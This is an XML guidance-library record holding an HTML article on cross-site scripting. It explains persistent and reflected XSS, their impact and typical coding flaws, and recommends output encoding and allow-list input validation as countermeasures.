    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Cross Site Scripting Attack</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Any</phase>
    <rule_Type>Attack</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;br&gt;
&lt;h1&gt;Applies To&lt;/h1&gt;
&lt;p&gt;All web applications.&lt;/p&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;A Cross Site Scripting (XSS) attack can cause arbitrary code to run in a user's browser while the browser is connected to a trusted Web site. The attack targets your application's users and not the application itself, but it uses your application as the
 vehicle for the attack. Because the script code is downloaded by the browser from a trusted site, the browser has no way of knowing that the code is not legitimate. Internet Explorer security zones provide no defense. As the attacker's code has access to the
 cookies associated with the trusted site and are stored on the user's local computer, a user's authentication cookies are typically the target of attack.
&lt;/p&gt;
&lt;p&gt;There are two primary types of XSS, persistent and non-persistent. If the attacker is able to inject his malicious script to the web applications data store, then the script will be persistent and anyone who then loads a page with that content will run the
 script and become a victim of the attack. Forums and other web services that have user supplied HTML content are a classic example of this. If this content is not validated and encoded then anyone can leave a malicious script on the site. Non-Persistent XSS
 uses some reflective aspect of the page to deliver the payload. Web applications often echo user input back to them without altering it. Search engines are a good example of this type of behavior. Attackers can create and distribute URLs that contain a malicious
 script that gets reflected back to the user. The most common example of this is the &amp;quot;page not found&amp;quot; error page which echoes the requested page back to the user.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Confidentiality: The most common attack performed with cross-site scripting involves the disclosure of information stored in user cookies.
&lt;/li&gt;&lt;li&gt;Access control: In some circumstances it may be possible to run arbitrary code on a victim's computer when cross-site scripting is combined with other flaws.
&lt;/li&gt;&lt;li&gt;Elevation of privilege: Even if an attacker cannot get at the authentication information of a user, they can act as that user.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Impact&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Credential compromise &lt;/li&gt;&lt;li&gt;Credential disclosure &lt;/li&gt;&lt;li&gt;Information disclosure &lt;/li&gt;&lt;li&gt;Execute code on client machine &lt;/li&gt;&lt;li&gt;Elevation of Privilege &lt;/li&gt;&lt;li&gt;Repudiation&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Vulnerabilities&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Failure to validate user input for script tags when that input can be echoed back into a web page.
&lt;/li&gt;&lt;li&gt;Trusting data retrieved from a shared database. &lt;/li&gt;&lt;li&gt;Failing to encode any remotely provided data, including reverse DNS lookup, cookie contents, uploaded files, etc.
&lt;/li&gt;&lt;li&gt;Improperly converting &amp;quot;safe&amp;quot; tags to HTML. &lt;/li&gt;&lt;li&gt;Displaying user input directly without encoding it appropriately for the context in which it is used.
&lt;/li&gt;&lt;li&gt;Checking user submitted data against a blacklist instead of a whitelist.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Countermeasures&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Perform context sensitive encoding of untrusted input before it is echoed back to a browser by using an encoding library (e.g., the Microsoft Anti-Cross Site Scripting Library or OWASP Reform). The following language-specific functionality may be helpful,
 is not sufficient to properly protect against cross-site scripting; a whitelisting library should be used instead. Most of these libraries only convert the symbols &amp;quot;, &amp;amp;, &amp;lt;, and &amp;gt; to safe HTML equivalents.
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Python&lt;/strong&gt;: cgi.escape (only escapes 3 characters by default, escaping &amp;quot; is optional)
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;ASP&lt;/strong&gt;: HttpUtility.HtmlEncode and HttpUtility.UrlEncode (only encodes 4 characters)
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Perl&lt;/strong&gt;: HTML::Entities::encode (only escapes 4 characters by default, but it makes it easy to specify other unsafe characters)
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;PHP&lt;/strong&gt;: htmlentities and urlencode (only escapes 4 characters by default, and can optionally encode ' (single quote))&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;Untrusted input should be validated against an inclusion list before use. For example, use a regular expressions to define acceptable character sequences and use it as a filter. f the input is meant to be a primitive type it can be cast appropriately to
 assure that it is the expected type (a type constraint) and then checked to ensure it's in appropriate range (a range constraint). In the case where there are only a limited number of acceptable inputs, then the input can be constrained to that set with simple
 if or switch control structures, or by matching against a fixed list of strings (a domain constraint).&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information on the Microsoft Anti-Cross Site Scripting Library, see the
&lt;a href="http://www.microsoft.com/downloads/details.aspx?familyid=9A2B9C92-7AD9-496C-9A89-AF08DE2E5982&amp;amp;displaylang=en"&gt;
Microsoft Downloads Site&lt;/a&gt; &lt;/li&gt;&lt;li&gt;For more information on the &amp;quot;Reform&amp;quot; encoding project, see &lt;a href="http://www.owasp.org/index.php/Category:OWASP_Encoding_Project"&gt;
The OWASP Encoding Project site&lt;/a&gt; &lt;/li&gt;&lt;li&gt;For more information on Cross Site Scripting, see &lt;a href="http://www.owasp.org/index.php/Cross_site_scripting"&gt;
Cross Site Scripting on the OWASP Site&lt;/a&gt; &lt;/li&gt;&lt;li&gt;For more information on attacks used in Cross Site Scripting, see &lt;a href="http://ha.ckers.org/xss.html"&gt;
ha.ckers.org&lt;/a&gt; &lt;/li&gt;&lt;li&gt;For more information on mitigations, see &lt;a href="http://msdn2.microsoft.com/en-us/library/ms998274.aspx"&gt;
How To: Prevent Cross-Site Scripting in ASP.NET&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:198CBDAF-3F87-4291-870D-8B6F077D8D36"&gt;Attack: AJAX Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:685CA8C0-E102-4517-A539-4B826D1962EB"&gt;Attack: Double Encoding Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:B9DD25F1-3C5C-40DD-A82E-464D0C02C14D"&gt;Attack: Command Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:DD60FFDF-904D-45A8-8278-F3E8CEBA911F"&gt;Guideline: Do Not Rely on Request Validation
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:0FFC3880-7F2B-47A5-BC54-F9BD39117BDD"&gt;Guideline: Validate Input from All Sources
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559"&gt;Guideline: Validate Input for Length, Range, Format, and Type
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1AB38C50-F31D-4CD8-89B1-CE397E6895E8"&gt;Guideline: Encode All Output Data
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:D6593992-DC9E-42C5-9E98-30E8EF075B93"&gt;Guideline: Do Not Rely on Client-Side Validation
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:F0E2BFFC-E6D1-4DC6-A6C2-D078F54AE10E"&gt;Guideline: Protect Session Cookies
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
</ArrayOfGuidanceItem_V3>